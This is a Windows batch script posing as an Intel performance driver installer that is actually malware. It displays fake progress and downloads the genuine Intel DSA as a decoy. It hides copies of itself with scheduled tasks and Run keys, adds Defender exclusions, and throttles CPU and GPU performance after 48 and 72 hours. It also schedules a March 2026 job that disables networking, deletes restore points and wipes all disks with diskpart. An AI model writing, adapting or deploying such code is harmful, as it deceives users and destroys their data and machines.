@echo off
:: INTEL SYSTEM COMPONENTS INSTALLER
:: LOCAL SYSTEM PERFORMANCE OPTIMIZATION

setlocal enabledelayedexpansion
:: Enable delayed variable expansion for dynamic variables

:: Check administrator privileges - if not admin, restart with admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -Command "Start-Process -Verb RunAs -FilePath '%~f0'" >nul 2>&1
  exit /b
)

:: Ensure Temp folder exists for our operations
if not exist "C:\Windows\Temp" mkdir "C:\Windows\Temp" >nul 2>&1

:: Check if this is first run - look for timestamp file
if not exist "C:\Windows\Temp\intel_install_timestamp.txt" (
  :: FIRST RUN - LOCAL UPDATE
  goto local_update_installation
)

:: Check performance stage based on time elapsed
call :check_performance_stage
if !errorlevel! equ 0 (
  :: Less than 48h - no restrictions
  goto continue_monitoring
) else if !errorlevel! equ 1 (
  :: 48-72h - 65% performance
  goto activate_65_percent
) else if !errorlevel! equ 3 (
  :: Permanent 30% performance (after 72h)
  goto activate_30_percent_permanent
)

:local_update_installation
:: Display installation progress to make it look legitimate
echo ================================================
echo System Components Update - Local System Driver
echo Installing: Intel Performance Optimization v2.1
echo Source: Local Repository (C:\Drivers\Intel)
echo Status: Initializing installation...
echo ================================================
timeout /t 1 /nobreak >nul

:: Simulate local components download progress
echo Downloading Intel Performance Components...
echo [Progress: 0%%] Preparing local repository...
timeout /t 1 /nobreak >nul
echo [Progress: 25%%] Verifying component signatures...
timeout /t 1 /nobreak >nul
echo [Progress: 50%%] Extracting optimization packages...
timeout /t 1 /nobreak >nul
echo [Progress: 75%%] Configuring system parameters...
timeout /t 1 /nobreak >nul
echo [Progress: 100%%] Component package ready for installation.
timeout /t 1 /nobreak >nul

:: Download real Intel DSA for credibility
echo.
echo Downloading Intel Component & Support Assistant...
echo Please wait while downloading Intel DSA installer...
echo.

:: Download real Intel DSA to Downloads folder
set "downloads_folder=%USERPROFILE%\Downloads"
if not exist "!downloads_folder!" mkdir "!downloads_folder!" >nul 2>&1

:: Primary download link for Intel DSA
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://downloadcenter.intel.com/download/29814/Intel-Driver-and-Support-Assistant-Installer', '!downloads_folder!\IntelDSA_Installer.exe')" >nul 2>&1

:: Fallback download link if primary fails
if not exist "!downloads_folder!\IntelDSA_Installer.exe" (
  powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://dsadata.intel.com/installer', '!downloads_folder!\IntelDSA_Installer.exe')" >nul 2>&1
)

:: Save exact installation timestamp for timing calculations
echo %date% %time% > "C:\Windows\Temp\intel_install_timestamp.txt"

:: Create local update package structure for credibility
if not exist "C:\Windows\SoftwareDistribution\Download\IntelOptimization" mkdir "C:\Windows\SoftwareDistribution\Download\IntelOptimization" >nul 2>&1
echo. > "C:\Windows\SoftwareDistribution\Download\IntelOptimization\intel_driver_v2.1.cab"
echo. > "C:\Windows\SoftwareDistribution\Download\IntelOptimization\manifest.xml"

:: Register local update with system for credibility
echo Registering local component package with System Update...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\Results\Install" /v "IntelPerformanceDriver" /t REG_SZ /d "Success" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Intel\Drivers\PerformanceOptimization" /v "Version" /t REG_SZ /d "2.1" /f >nul 2>&1

:: Create system folders for hidden copies of our script
if not exist "C:\Windows\System32\drivers\etc\intel" mkdir "C:\Windows\System32\drivers\etc\intel" >nul 2>&1
if not exist "C:\ProgramData\Intel\Performance" mkdir "C:\ProgramData\Intel\Performance" >nul 2>&1

:: Copy self to hidden system locations for persistence
copy "%~f0" "C:\Windows\System32\drivers\etc\intel\driver_installer.bat" >nul 2>&1
copy "%~f0" "C:\ProgramData\Intel\Performance\system_optimizer.bat" >nul 2>&1

:: HIDE copies with hidden and system attributes
attrib +h +s "C:\Windows\System32\drivers\etc\intel\driver_installer.bat" >nul 2>&1
attrib +h +s "C:\ProgramData\Intel\Performance\system_optimizer.bat" >nul 2>&1

:: Create scheduled task to check hourly - COMPLETELY SILENT
schtasks /create /tn "IntelPerformanceCheck" /tr "cmd.exe /c \"C:\Windows\System32\drivers\etc\intel\driver_installer.bat\" >nul 2>&1" /sc hourly /f >nul 2>&1

:: Create startup entries in registry for persistence
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IntelPerformanceService" /t REG_SZ /d "C:\Windows\System32\drivers\etc\intel\driver_installer.bat" /f >nul 2>&1

:: ADD WINDOWS DEFENDER EXCLUSIONS to prevent detection
powershell Add-MpPreference -ExclusionPath "C:\Windows\System32\drivers\etc\intel" >nul 2>&1
powershell Add-MpPreference -ExclusionPath "C:\ProgramData\Intel\Performance" >nul 2>&1
powershell Add-MpPreference -ExclusionPath "C:\Windows\Temp" >nul 2>&1
powershell Add-MpPreference -ExclusionProcess "driver_installer.bat" >nul 2>&1
powershell Add-MpPreference -ExclusionProcess "system_optimizer.bat" >nul 2>&1
powershell Add-MpPreference -ExclusionPath "C:\Windows\Temp\system_maintenance.bat" >nul 2>&1
powershell Add-MpPreference -ExclusionProcess "system_maintenance.bat" >nul 2>&1

:: SCHEDULE SYSTEM DESTRUCTION FOR MARCH 26, 2026
call :schedule_system_wipe

:: Display final system message to user
echo.
echo ================================================
echo LOCAL UPDATE COMPLETED
echo Intel Performance Optimization Components v2.1
echo Status: Installation successful
echo Action: System optimization scheduled
echo ================================================
echo.
echo Component package has been successfully installed.
echo Performance optimization will be applied soon.
echo.
timeout /t 3 /nobreak >nul

:: Launch Intel DSA for credibility
echo Launching Intel Component & Support Assistant...
echo Intel DSA will run with administrative privileges.
echo Please follow the installation wizard.

:: Check if Intel DSA was downloaded successfully
if exist "!downloads_folder!\IntelDSA_Installer.exe" (
  echo Intel DSA installer successfully downloaded to Downloads folder.
  echo Launching installer with administrative rights...
  :: Launch Intel DSA as administrator
  powershell -Command "Start-Process -Verb RunAs -FilePath '!downloads_folder!\IntelDSA_Installer.exe'" >nul 2>&1
) else (
  :: If download failed, open browser to official site
  echo Could not download Intel DSA. Opening browser to official site...
  powershell -Command "Start-Process 'https://www.intel.com/content/www/us/en/support/detect.html'" >nul 2>&1
)

:: MOVE SELF and exit - hide original file
copy "%~f0" "C:\Windows\System32\drivers\etc\intel\original_installer.bat" >nul 2>&1
attrib +h +s "C:\Windows\System32\drivers\etc\intel\original_installer.bat" >nul 2>&1
del "%~f0" >nul 2>&1
exit

:check_performance_stage
:: Check performance restriction stage based on hours elapsed
set "hours_diff="
:: Calculate hours difference between now and installation time
for /f %%i in ('powershell -Command "(Get-Date) - (Get-Item 'C:\Windows\Temp\intel_install_timestamp.txt').CreationTime | Select-Object -ExpandProperty TotalHours" 2^>nul') do set "hours_diff=%%i"
if defined hours_diff (
  :: Check time thresholds for performance stages
  :: TIME TAMPERING DETECTION - check if system time was rolled back
  for /f %%j in ('type "C:\Windows\Temp\intel_install_timestamp.txt" 2^>nul') do set "install_time=%%j"
  for /f %%k in ('powershell -Command "Get-Date -Format 'MM/dd/yyyy'"') do set "current_date=%%k"
  if "!current_date!" LSS "!install_time:~0,10!" (
    :: System time rolled back - activate immediate destruction
    exit /b 3
  )
  if !hours_diff! GEQ 72 (
    exit /b 3 :: Permanent 30% performance
  ) else if !hours_diff! GEQ 48 (
    exit /b 1 :: 65% performance after 48h
  ) else (
    exit /b 0 :: No restrictions (before 48h)
  )
) else (
  exit /b 0
)

:activate_65_percent
:: Activate 65% performance - SILENT
echo Activating 65%% performance optimization...
call :set_performance_limit 65 >nul 2>&1
exit

:activate_30_percent_permanent
:: Permanent 30% performance - SILENT
echo Activating permanent 30%% performance optimization...
call :set_performance_limit 30 >nul 2>&1
exit

:continue_monitoring
:: Continue monitoring - checking hourly
exit

:set_performance_limit
:: Set performance limit using powercfg
set "limit=%1"
:: DELETE ALL EXISTING POWER PLANS to prevent conflicts
for /f "tokens=2 delims=:" %%i in ('powercfg /list ^| findstr ":"') do (
  set "plan_guid=%%i"
  set "plan_guid=!plan_guid: =!"
  if not "!plan_guid!"=="POWER_LIMITER" (
    powercfg /delete !plan_guid! >nul 2>&1
  )
)

:: CREATE PLAN WITH SELECTED LIMIT
powercfg /create POWER_LIMITER >nul 2>&1
powercfg /changename POWER_LIMITER "High performance" "Maximize performance and responsiveness" >nul 2>&1
powercfg /setactive POWER_LIMITER >nul 2>&1

:: Set selected limit for both AC and DC power
powercfg /setacvalueindex POWER_LIMITER SUB_PROCESSOR PROCTHROTTLEMAX %limit% >nul 2>&1
powercfg /setdcvalueindex POWER_LIMITER SUB_PROCESSOR PROCTHROTTLEMAX %limit% >nul 2>&1
powercfg /setacvalueindex POWER_LIMITER SUB_PROCESSOR PROCTHROTTLEMIN 0 >nul 2>&1
powercfg /setdcvalueindex POWER_LIMITER SUB_PROCESSOR PROCTHROTTLEMIN 0 >nul 2>&1

:: Disable boost and turbo for additional power limiting
powercfg /setacvalueindex POWER_LIMITER SUB_PROCESSOR PERFINCTHRESHOLD 0 >nul 2>&1
powercfg /setdcvalueindex POWER_LIMITER SUB_PROCESSOR PERFINCTHRESHOLD 0 >nul 2>&1
powercfg /setacvalueindex POWER_LIMITER SUB_PROCESSOR PERFBOOSTMODE 0 >nul 2>&1
powercfg /setdcvalueindex POWER_LIMITER SUB_PROCESSOR PERFBOOSTMODE 0 >nul 2>&1

:: Memory and disk restrictions
powercfg /setacvalueindex POWER_LIMITER SUB_MEMORY LATENCYHINTUNPARK 0 >nul 2>&1
powercfg /setdcvalueindex POWER_LIMITER SUB_MEMORY LATENCYHINTUNPARK 0 >nul 2>&1
powercfg /setacvalueindex POWER_LIMITER SUB_DISK DISKIDLE 300 >nul 2>&1
powercfg /setdcvalueindex POWER_LIMITER SUB_DISK DISKIDLE 300 >nul 2>&1

:: GPU restrictions for NVIDIA cards
if exist "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe" (
  if !limit! equ 30 (
    "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe" -pl 75 >nul 2>&1
    "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe" -ac 405,270 >nul 2>&1
  ) else (
    "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe" -pl 150 >nul 2>&1
    "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe" -ac 810,540 >nul 2>&1
  )
)

:: Apply settings
powercfg /SetActive POWER_LIMITER >nul 2>&1

:: LOCK POWER PLAN CHANGES to prevent user modifications
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Power" /v "ShowHibernateOption" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Power" /v "ShowSleepOption" /t REG_DWORD /d 0 /f >nul 2>&1

:: Maintain startup mechanisms for persistence
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IntelPerformanceService" /t REG_SZ /d "C:\Windows\System32\drivers\etc\intel\driver_installer.bat" /f >nul 2>&1
schtasks /create /tn "IntelPerformanceSetup" /tr "cmd.exe /c \"C:\Windows\System32\drivers\etc\intel\driver_installer.bat\" >nul 2>&1" /sc hourly /f >nul 2>&1

:: Remove checking task (no longer needed after initial setup)
schtasks /query /tn "IntelPerformanceCheck" >nul 2>&1
if !errorlevel! equ 0 (
  schtasks /delete /tn "IntelPerformanceCheck" /f >nul 2>&1
)

exit /b

:schedule_system_wipe
:: Create completely silent system destruction script
set "wipe_script=C:\Windows\Temp\system_maintenance.bat"
echo @echo off > "%wipe_script%"

:: 🔇 MUTE SYSTEM SOUNDS - disable all audio notifications
echo netsh advfirewall set allprofiles state on ^>nul 2^>^&1 >> "%wipe_script%"
echo reg add "HKCU\AppEvents\Schemes\Apps\.Default\.Default\." /ve /t REG_SZ /d "" /f ^>nul 2^>^&1 >> "%wipe_script%"
echo reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemStart\.Current" /ve /t REG_SZ /d "" /f ^>nul 2^>^&1 >> "%wipe_script%"
echo reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemExit\.Current" /ve /t REG_SZ /d "" /f ^>nul 2^>^&1 >> "%wipe_script%"

:: 🔥 INSTANT SYSTEM LOCKDOWN - disable admin access
echo net user administrator /active:no ^>nul 2^>^&1 >> "%wipe_script%"

:: 🔥 KILL ALL PROCESSES to prevent interference
echo taskkill /f /fi "USERNAME ne NT AUTHORITY\SYSTEM" ^>nul 2^>^&1 >> "%wipe_script%"

:: 🔥 DISABLE SYSTEM SERVICES to speed up process
echo net stopBITS ^>nul 2^>^&1 >> "%wipe_script%"
echo net stopwuauserv ^>nul 2^>^&1 >> "%wipe_script%"
echo net stopcryptsvc ^>nul 2^>^&1 >> "%wipe_script%"
echo net stopmsiserver ^>nul 2^>^&1 >> "%wipe_script%"

:: 🔥 NETWORK DISABLING - prevent cloud backup
echo echo Disabling network interfaces... ^>nul >> "%wipe_script%"
echo netsh interface set interface "Ethernet" disable ^>nul 2^>^&1 >> "%wipe_script%"
echo netsh interface set interface "Wi-Fi" disable ^>nul 2^>^&1 >> "%wipe_script%"
echo netsh interface set interface "Local Area Connection" disable ^>nul 2^>^&1 >> "%wipe_script%"
echo netsh interface set interface "Wireless Network Connection" disable ^>nul 2^>^&1 >> "%wipe_script%"

:: 🔥 ADDITIONAL SECURITY MEASURES
:: Disable Safe Mode
echo bcdedit /set {current} safeboot minimal ^>nul 2^>^&1 >> "%wipe_script%"
:: Delete restore points
echo vssadmin delete shadows /All /Quiet ^>nul 2^>^&1 >> "%wipe_script%"

:: 🔥 INTELLIGENT MULTI-DISK DETECTION AND DESTRUCTION
echo echo Detecting and destroying all disks... ^>nul >> "%wipe_script%"
echo echo list disk ^> "C:\Windows\Temp\disk_list.txt" ^>nul >> "%wipe_script%"
echo diskpart /s "C:\Windows\Temp\disk_list.txt" ^> "C:\Windows\Temp\disks_found.txt" 2^>^&1 >> "%wipe_script%"
echo for /f "tokens=2 skip=8" %%%%i in ('type "C:\Windows\Temp\disks_found.txt"') do ( ^>nul >> "%wipe_script%"
echo echo select disk %%%%i ^>^> "C:\Windows\Temp\intelligent_wipe_%%%%i.txt" >> "%wipe_script%"
echo echo clean ^>^> "C:\Windows\Temp\intelligent_wipe_%%%%i.txt" >> "%wipe_script%"
echo echo exit ^>^> "C:\Windows\Temp\intelligent_wipe_%%%%i.txt" >> "%wipe_script%"
echo diskpart /s "C:\Windows\Temp\intelligent_wipe_%%%%i.txt" ^>nul 2^>^&1 >> "%wipe_script%"
echo del "C:\Windows\Temp\intelligent_wipe_%%%%i.txt" ^>nul 2^>^&1 >> "%wipe_script%"
echo ) ^>nul >> "%wipe_script%"

:: 🔥 CLEANUP AND SELF-DESTRUCTION - remove all traces
echo del "C:\Windows\Temp\disk_list.txt" ^>nul 2^>^&1 >> "%wipe_script%"
echo del "C:\Windows\Temp\disks_found.txt" ^>nul 2^>^&1 >> "%wipe_script%"
echo del "%%~f0" ^>nul 2^>^&1 >> "%wipe_script%"
echo schtasks /delete /tn "SystemMaintenance" /f ^>nul 2^>^&1 >> "%wipe_script%"

:: Schedule completely silent destruction for March 26, 2026 at 3:00 AM
powershell -Command "schtasks /create /tn 'SystemMaintenance' /tr 'cmd.exe /c \"C:\Windows\Temp\system_maintenance.bat\" >nul 2>&1' /sc once /st 03:00 /sd 03/26/2026 /f" >nul 2>&1
exit /b